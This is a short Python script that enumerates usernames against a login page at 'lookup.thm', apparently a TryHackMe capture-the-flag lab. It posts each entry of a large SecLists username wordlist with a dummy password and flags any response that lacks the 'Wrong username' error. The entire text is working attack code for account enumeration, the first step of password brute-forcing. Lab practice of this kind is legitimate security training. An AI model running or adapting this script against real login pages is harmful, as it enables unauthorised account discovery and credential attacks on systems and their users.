import requests
# from bs4 import BeautifulSoup

URL = 'http://lookup.thm/login.php'

with open('/usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt', 'r') as fh:
    usernames = fh.readlines()

    valid_users = []
    payload = {'username': '', 'password': "whatever"}

    for user in usernames:
        payload['username'] = user.strip()
        print(f'Attempting\t{user}')

        req = requests.post(URL, payload)

        if 'Wrong username' not in req.text:
            print(f'FOUND VALID USER: {user}')
            valid_users.append(user)
        print('Found users: ', valid_users)
    print(f'Valid USERS: ', valid_users)
